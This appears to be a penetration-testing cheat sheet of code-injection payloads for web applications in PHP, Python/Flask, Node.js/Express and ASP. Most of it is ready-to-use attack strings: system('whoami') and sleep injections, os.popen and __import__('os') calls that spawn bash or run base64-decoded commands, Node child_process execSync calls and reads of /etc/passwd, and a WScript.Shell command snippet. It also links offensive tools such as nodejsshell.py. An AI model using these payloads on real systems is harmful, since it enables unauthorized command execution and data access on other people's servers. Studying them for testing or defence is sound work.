# Code Execution

## PHP

```php
...?arg="; system("whoami"); //       "
...?arg="; sleep(10); //       "
...?arg="."ha"."cker"."; // # Concatenate strings with the dot (.)
...?arg="./*leviswings*/" # A string between comments. If nothing comes out, it is normal, since it is commented.
...?arg=// # Use comments to see what happens.
```

## Python (Flask, etc.)

```python
...?arg="+os.system('whoami')+"
...?arg="+os.popen('whoami').read()+"
...?arg="__import__('os').system('bash')"
...?arg="+__import__('os').popen('whoami').read()+" # In case the OS module is not imported, we import it ourselves.
...?arg="+str(__import__('os').system(__import__('base64').b64decode('<BASE64 COMMAND>')))+"
```

## Node.js (Express.js)

{% hint style="info" %}
For more information about the Node.js process, you can use the functions, properties or global variables in the Node.js documentation: https://nodejs.org/api/process.html
{% endhint %}

{% hint style="danger" %}
If we are exploiting a website, the command we insert must be in URL encode, otherwise, it is very likely to give us an error.
{% endhint %}

```javascript
// fs class (list and read files):
require('fs').readdirSync('.').toString() // List actual directory
res.end(require('fs').readdirSync('.').toString())
require('fs').readdirSync('..').toString()
require("fs");fs.readdirSync("/app").toString('utf8')
require("fs").readdirSync('/etc/passwd')
require("fs");fs.readdirSync('/etc/passwd').toString('utf8')

// child_process module (command execution):
// The child_process module allows you to create child processes in Node.js. 
// There are 4 different ways to create a child process: spawn(), fork(), exec(), execFile.
require("child_process").exec('<COMMAND>') // Recordar que si hay espacios, hay que hacer un URL encode
require('child_process').execSync('<COMMAND>').toString(); // Output
(() => { return require("child_process").execSync("<COMMAND>;", { timeout: 5000 }); })(); // the timeout is to kill processes that take too long to finish
```

### Tools

We can also use `nodexp.py`, a **server-side Javascript injection** **tool** capable of detecting and exploiting Node.js vulnerabilities.

{% embed url="https://github.com/esmog/nodexp" %}

#### nodejsshell.py

{% embed url="https://raw.githubusercontent.com/carnal0wnage/exploits-1/master/nodejsshell.py" %}

#### nodejsscan

{% embed url="https://repo.telematika.org/project/ajinabraham_nodejsscan" %}

### References

[https://snyk.io/blog/5-ways-to-prevent-code-injection-in-javascript-and-node-js/](https://snyk.io/blog/5-ways-to-prevent-code-injection-in-javascript-and-node-js/)

{% embed url="https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet" %}

{% embed url="https://github.com/OWASP/NodeGoat" %}

{% embed url="https://nodegoat.herokuapp.com/tutorial" %}

## ASP

```aspnet
<%
Set objShell = CreateObject("WScript.Shell")
Set cmd = objShell.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```
